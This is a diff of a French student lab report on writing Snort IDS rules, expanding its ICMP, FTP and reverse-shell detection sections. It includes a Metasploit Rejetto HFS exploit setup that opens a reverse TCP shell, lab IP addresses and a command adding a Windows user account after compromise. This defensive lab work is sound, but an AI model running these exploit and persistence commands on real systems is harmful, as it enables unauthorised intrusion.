@@ -198,7 +198,7 @@ J'ai effectué un ping depuis la machine Kali Linux vers mon système Ubuntu pou
 **Sur Kali Linux**:
 
 ```bash
-ping 192.168.x.x
+ping 192.168.12.129
 ```
 
 À mon retour sur la console Snort, j'ai observé la génération de multiples alertes pour chaque paquet ICMP, confirmant que la règle fonctionnait correctement.
@@ -218,13 +218,13 @@ Pour une détection plus ciblée, j'ai créé une deuxième règle spécifique p
 **Règle FTP créée**:
 
 ```
-alert tcp 192.168.x.x any -> $HOME_NET 21 (msg:"FTP connection attempt"; sid:1000002; rev:1;)
+alert tcp 192.168.12.148 any -> $HOME_NET 21 (msg:"FTP connection attempt"; sid:1000002; rev:1;)
 ```
 
 **Explication de la règle**:
 
 - `tcp`: Protocole TCP uniquement
-- `192.168.x.x`: IP source spécifique (Kali Linux)
+- `192.168.12.148`: IP source spécifique (Kali Linux)
 - `21`: Port FTP standard
 - `rev:1`: Numéro de révision de la règle
 
@@ -263,7 +263,7 @@ Depuis la VM Kali Linux, j'ai initié une connexion FTP vers mon système Ubuntu
 **Commande FTP sur Kali**:
 
 ```bash
-ftp 192.168.x.x
+ftp 192.168.12.139
 ```
 
 ![Testing FTP Connection Detection](9.-Testing-FTP-Connection-Detection.png)
@@ -405,8 +405,8 @@ J'ai lancé Metasploit sur Kali Linux et configuré l'exploit Rejetto HFS avec l
 msfconsole
 use exploit/windows/http/rejetto_hfs_exec
 set PAYLOAD windows/shell/reverse_tcp
-set LHOST 192.168.x.x  # IP de Kali Linux
-set RHOST 192.168.x.x  # IP de Windows Server
+set LHOST 192.168.12.148  # IP de Kali Linux
+set RHOST 192.168.12.149  # IP de Windows Server
 set RPORT 8081
 ```
 
@@ -482,9 +482,9 @@ Après avoir obtenu l'accès au shell Windows, j'ai créé un compte utilisateur
 **Commandes exécutées**:
 
 ```cmd
-net user votrenom P@ssword12 /ADD
+net user chakibtest P@ssword12 /ADD
 cd \
-mkdir votrenom
+mkdir chakibtest
 ```
 
 ![Exo2-4](Exo2-4.png)
@@ -556,22 +556,426 @@ Développer des règles Snort avancées basées sur le contenu textuel et hexad�
 
 ---
 
-1. adding the new allert rule :
+### 1. Création d'une Règle Basée sur du Contenu Texte
+
+J'ai ajouté une nouvelle règle dans le fichier `local.rules` pour détecter la signature textuelle de l'exploit Rejetto HFS.
+
+**Règle de détection basée sur du texte**:
+
+```
+alert tcp $HOME_NET any -> any any (msg:"Command Shell Access"; content:"C:\\Users\\Administrator\\Desktop\\hfs2.3b"; sid:1000004; rev:1;)
+```
 
 ![exo3-1](exo3-1.png)
 
-2. after rerunning snort with this new rule :
+**Explication de la règle**:
+
+- Détecte le trafic sortant de notre réseau (shell inversé)
+- Recherche la chaîne caractéristique du shell Rejetto
+- Chaque `\` doit être échappé avec `\\` dans les règles Snort
+- `sid:1000004`: Identifiant unique pour cette règle personnalisée
+
+**Application**: Cette règle détecte immédiatement une compromission réussie par l'exploit Rejetto HFS.
+
+---
+
+### 2. Test de la Règle de Détection Textuelle
+
+Après avoir relancé Snort avec la nouvelle règle, j'ai réexécuté l'exploit depuis Metasploit pour tester la détection.
+
+**Commande de démarrage Snort**:
+
+```bash
+sudo snort -A console -q -c /etc/snort/snort.conf -i ens33
+```
 
 ![exo3-2](exo3-2.png)
 
-3. writing the new rule for the hex values :
+**Résultat**: Multiples alertes "Command Shell Access" ont été générées, confirmant que la règle détecte correctement l'activité malveillante!
+
+**Analyse**: Chaque paquet contenant le prompt du shell a déclenché une alerte, prouvant l'efficacité de la détection basée sur le contenu.
+
+---
+
+### 3. Création d'une Règle avec Contenu Hexadécimal
+
+Pour une détection plus précise et résistante à l'obfuscation, j'ai créé une règle basée sur les valeurs hexadécimales.
+
+#### Pourquoi l'Hexadécimal?
+
+**Avantages**:
+
+- Détecte le contenu binaire, encodé ou obfusqué
+- Plus précis que le texte simple
+- Résistant aux variations d'encodage
+- Peut cibler des patterns non imprimables
+
+#### Préparation de la Règle Hexadécimale
+
+J'ai copié la règle existante (`sid:1000004`) et modifié le numéro de révision pour préparer la nouvelle version.
+
+**Processus**:
+
+1. Copie de la règle avec `rev:1`
+2. Commentaire de l'ancienne version
+3. Modification de `rev:1` en `rev:2` pour la nouvelle version
 
 ![exo3-3](exo3-3.png)
 
-4. writing with the new hex dump :
+**Bonne pratique**: Les numéros de révision permettent de tracer l'évolution des règles.
+
+---
+
+### 4. Extraction et Intégration du Contenu Hexadécimal
+
+J'ai utilisé Wireshark pour extraire la représentation hexadécimale de la signature d'attaque.
+
+**Méthode d'extraction**:
+
+1. Sélection du paquet contenant `C:\Users\Administrator\Desktop\hfs2.3b>` dans Wireshark
+2. Dans le panneau du milieu, sélection de la ligne "Data"
+3. Clic droit → `Copy` → `Bytes` → `Offset Hex`
+4. Nettoyage des valeurs hexadécimales:
+   - Suppression des espaces
+   - Suppression des offsets (numéros de ligne)
+   - Conservation uniquement des valeurs hexadécimales
+5. Encadrement avec des pipes `|valeurs_hex|`
+
+**Règle finale avec contenu hexadécimal**:
+
+```
+alert tcp $HOME_NET any -> any any (msg:"Command Shell Access"; content:"|43 3a 5c 55 73 65 72 73 5c 41 64 6d 69 6e 69 73 74 72 61 74 6f 72 5c 44 65 73 6b 74 6f 70 5c 68 66 73 32 2e 33 62 3e|"; sid:1000004; rev:2;)
+```
 
 ![exo3-4](exo3-4.png)
 
-5. finding 2 alerts :
+**Note**: Le caractère `>` (3e en hexadécimal) est inclus dans cette version, ce qui rend la règle plus précise.
+
+---
+
+### 5. Test de la Règle Hexadécimale
+
+J'ai testé la règle hexadécimale en relançant l'exploit et en observant les alertes générées.
+
+**Résultat**:
 
 ![exo3-5](exo3-5.png)
+
+**Observation importante**: Cette fois, seulement **2 alertes** ont été générées au lieu de 4 avec la règle textuelle!
+
+**Analyse comparative**:
+
+| Type de Règle                  | Nombre d'Alertes | Précision     |
+| ------------------------------ | ---------------- | ------------- |
+| Contenu texte (sans `>`)       | 4 alertes        | Moins précise |
+| Contenu hexadécimal (avec `>`) | 2 alertes        | Plus précise  |
+
+**Explication**:
+
+- La règle hexadécimale inclut le caractère `>` qui apparaît moins fréquemment
+- Réduit les faux positifs en ciblant spécifiquement le prompt complet
+- Détection plus précise et plus fiable
+
+**Conclusion**: Les règles hexadécimales offrent une détection plus granulaire et sont préférables pour les signatures complexes.
+
+---
+
+## 📊 Analyse et Conclusions {#conclusions}
+
+### Compétences Acquises
+
+Au cours de ce laboratoire, nous avons développé les compétences suivantes:
+
+✅ **Installation et Configuration**
+
+- Installation de Snort sur Ubuntu
+- Configuration du réseau protégé (HOME_NET)
+- Validation de la configuration Snort
+
+✅ **Création de Règles de Détection**
+
+- Règles ICMP pour la détection de ping
+- Règles TCP pour le monitoring FTP
+- Règles basées sur le contenu (content matching)
+- Règles hexadécimales avancées
+
+✅ **Analyse de Trafic Réseau**
+
+- Capture de paquets avec Snort
+- Analyse avec Wireshark
+- Suivi de flux TCP
+- Identification de signatures d'attaque
+
+✅ **Simulation d'Attaque Réelle**
+
+- Configuration d'exploits Metasploit
+- Capture de trafic malveillant
+- Analyse post-exploitation
+- Développement de contre-mesures
+
+---
+
+### Concepts Clés
+
+#### Structure d'une Règle Snort
+
+```
+action protocol source_ip source_port direction dest_ip dest_port (options)
+```
+
+#### Actions Principales
+
+- `alert`: Génère une alerte et log
+- `log`: Enregistre uniquement le paquet
+- `pass`: Ignore le paquet
+- `drop`: Bloque le paquet (mode IPS)
+- `reject`: Bloque et envoie une réponse (mode IPS)
+
+#### Options de Règles Importantes
+
+| Option      | Description                 | Exemple                  |
+| ----------- | --------------------------- | ------------------------ |
+| `msg`       | Message de l'alerte         | `msg:"ICMP test"`        |
+| `sid`       | ID unique (>1000000 custom) | `sid:1000001`            |
+| `rev`       | Numéro de révision          | `rev:1`                  |
+| `content`   | Contenu à rechercher        | `content:"Login failed"` |
+| `classtype` | Catégorie de la règle       | `classtype:icmp-event`   |
+
+#### Modes de Snort
+
+**1. Mode Sniffer** (`-v`)
+
+- Affiche les paquets en temps réel
+- Utile pour le débogage
+
+**2. Mode Logger** (`-l`)
+
+- Enregistre les paquets dans des fichiers
+- Format pcap pour analyse ultérieure
+
+**3. Mode IDS** (`-c`)
+
+- Détecte selon des règles prédéfinies
+- Génère des alertes pour activités suspectes
+
+---
+
+### Statistiques du Laboratoire
+
+**Règles Créées**: 4 règles personnalisées
+
+- 1 règle ICMP (sid:1000001)
+- 1 règle FTP connexion (sid:1000002)
+- 1 règle FTP échec login (sid:1000003)
+- 2 versions règle exploit detection (sid:1000004 rev:1 et rev:2)
+
+**Attaques Simulées**: 1 exploitation Rejetto HFS
+
+- Obtention de shell distant
+- Création de compte utilisateur
+- Exécution de commandes arbitraires
+
+**Outils Utilisés**:
+
+- Snort (IDS/IPS)
+- Wireshark (Analyse de paquets)
+- Metasploit (Framework d'exploitation)
+- Kali Linux (Plateforme d'attaque)
+- Windows Server 2012 R2 (Système cible)
+- Ubuntu Desktop (Système de détection)
+
+---
+
+### Comparaison: Règles Texte vs Hexadécimales
+
+**Règles Basées sur du Texte**
+
+- ✅ Plus faciles à lire et maintenir
+- ✅ Idéales pour les signatures ASCII claires
+- ❌ Sensibles aux variations d'encodage
+- ❌ Ne détectent pas le contenu binaire
+
+**Règles Basées sur l'Hexadécimal**
+
+- ✅ Plus précises et granulaires
+- ✅ Détectent le contenu binaire/encodé
+- ✅ Résistantes à l'obfuscation
+- ✅ Moins de faux positifs
+- ❌ Plus difficiles à créer et maintenir
+- ❌ Moins lisibles
+
+**Recommandation**: Utiliser les règles hexadécimales pour les signatures critiques nécessitant une précision maximale, et les règles textuelles pour les détections générales.
+
+---
+
+### Faux Positifs vs Faux Négatifs
+
+**Faux Positif**: Alerte générée pour du trafic légitime
+
+- **Impact**: Surcharge de travail pour les analystes
+- **Solution**: Affiner les règles, ajouter des critères plus spécifiques
+
+**Faux Négatif**: Absence d'alerte pour une attaque réelle
+
+- **Impact**: Compromission non détectée (critique!)
+- **Solution**: Élargir les règles, tester avec différents scénarios
+
+**Équilibre**: Une bonne règle minimise les deux types d'erreurs.
+
+---
+
+### Limitations et Améliorations Possibles
+
+#### Limitations Identifiées
+
+1. **Dépendance aux Signatures**
+
+   - Snort détecte uniquement les attaques connues
+   - Nouvelles techniques d'attaque non détectées
+
+2. **Performance**
+
+   - L'inspection profonde des paquets consomme des ressources
+   - Impact sur les réseaux à haut débit
+
+3. **Chiffrement**
+   - Le trafic HTTPS/TLS n'est pas inspecté
+   - Les attaquants peuvent utiliser le chiffrement pour éviter la détection
+
+#### Améliorations Possibles
+
+1. **Règles Communautaires**
+
+   - Intégrer les règles Snort Community/VRT
+   - Mises à jour régulières des signatures
+
+2. **Apprentissage Automatique**
+
+   - Utiliser l'IA pour détecter les anomalies
+   - Détection des attaques zero-day
+
+3. **Corrélation d'Événements**
+
+   - Intégrer avec un SIEM (Security Information and Event Management)
+   - Analyse contextuelle multi-sources
+
+4. **Mode IPS**
+
+   - Passer du mode IDS (détection) au mode IPS (prévention)
+   - Blocage automatique des attaques
+
+5. **Inspection SSL/TLS**
+   - Déchiffrement et inspection du trafic chiffré
+   - Nécessite une infrastructure PKI appropriée
+
+---
+
+### Checklist de Réalisation du TP
+
+- [x] Snort installé et vérifié
+- [x] HOME_NET correctement configuré
+- [x] Configuration testée avec succès
+- [x] Règle ICMP créée et testée (sid:1000001)
+- [x] Règle FTP connexion créée et testée (sid:1000002)
+- [x] Règle FTP échec login créée et testée (sid:1000003)
+- [x] Logs Snort examinés (format ASCII et PCAP)
+- [x] Analyse Wireshark effectuée
+- [x] Attaque Metasploit exécutée avec succès
+- [x] Trafic malveillant capturé et analysé
+- [x] Flux TCP reconstitué
+- [x] Signature d'attaque identifiée
+- [x] Règle de détection textuelle créée (sid:1000004 rev:1)
+- [x] Règle de détection hexadécimale créée (sid:1000004 rev:2)
+- [x] Toutes les règles testées et validées
+
+---
+
+### Perspectives et Applications Pratiques
+
+**Environnements Applicables**:
+
+- Réseaux d'entreprise
+- Centres de données
+- Infrastructures critiques
+- Environnements cloud (avec adaptations)
+
+**Cas d'Usage Réels**:
+
+1. **Détection d'Intrusions**
+
+   - Monitoring 24/7 du trafic réseau
+   - Alertes en temps réel
+
+2. **Analyse Forensique**
+
+   - Investigation post-incident
+   - Reconstitution des attaques
+
+3. **Conformité Réglementaire**
+
+   - PCI-DSS (Payment Card Industry Data Security Standard)
+   - HIPAA (Health Insurance Portability and Accountability Act)
+   - RGPD (Règlement Général sur la Protection des Données)
+
+4. **Threat Hunting**
+   - Recherche proactive de menaces
+   - Analyse des IOC (Indicators of Compromise)
+
+---
+
+### Ressources Complémentaires
+
+**Documentation Officielle**:
+
+- [Snort User Manual](https://www.snort.org/documents)
+- [Snort Rule Writing Guide](https://www.snort.org/documents)
+- [Wireshark User Guide](https://www.wireshark.org/docs/)
+
+**Règles Communautaires**:
+
+- Snort Community Rules
+- Emerging Threats Rules
+- VRT (Vulnerability Research Team) Rules
+
+**Outils Complémentaires**:
+
+- **Suricata**: IDS/IPS alternatif moderne
+- **Zeek (Bro)**: Analyse de trafic réseau
+- **Security Onion**: Distribution Linux intégrée pour la sécurité réseau
+- **OSSEC**: HIDS (Host-based IDS)
+
+---
+
+## 🎓 Conclusion Finale
+
+Ce laboratoire a démontré l'importance d'un système de détection d'intrusion bien configuré pour identifier et analyser les activités malveillantes sur un réseau. Nous avons progressé depuis la configuration de base de Snort jusqu'à la création de règles de détection sophistiquées basées sur l'analyse d'une attaque réelle.
+
+**Points Clés à Retenir**:
+
+1. **Configuration Méticuleuse**: Une configuration correcte (HOME_NET, interfaces, règles) est essentielle pour une détection efficace.
+
+2. **Règles Personnalisées**: La capacité de créer des règles adaptées aux menaces spécifiques est cruciale pour une défense proactive.
+
+3. **Analyse Approfondie**: L'utilisation combinée de Snort et Wireshark permet une compréhension complète des attaques.
+
+4. **Détection Multicouche**: Combiner différents types de règles (ICMP, TCP, contenu, hexadécimal) offre une protection plus robuste.
+
+5. **Itération et Amélioration**: Les règles doivent être testées, affinées et mises à jour régulièrement pour maintenir leur efficacité.
+
+**Prochaines Étapes Recommandées**:
+
+- Explorer les règles communautaires Snort
+- Apprendre l'optimisation des performances de Snort
+- Étudier l'intégration avec des SIEM
+- Pratiquer avec d'autres types d'attaques (SQL injection, XSS, etc.)
+- Expérimenter avec le mode IPS (prévention)
+- Approfondir l'analyse forensique avec Wireshark
+
+La cybersécurité est un domaine en constante évolution. Les compétences acquises dans ce TP constituent une base solide pour développer une expertise approfondie en détection d'intrusions et défense réseau.
+
+---
+
+**Rapport réalisé par**: Aoudia Nour Islam  
+**Date**: Décembre 2025  
+**Environnement**: Ubuntu Desktop, Windows Server 2012 R2, Kali Linux  
+**Outils**: Snort 2.x, Wireshark, Metasploit Framework
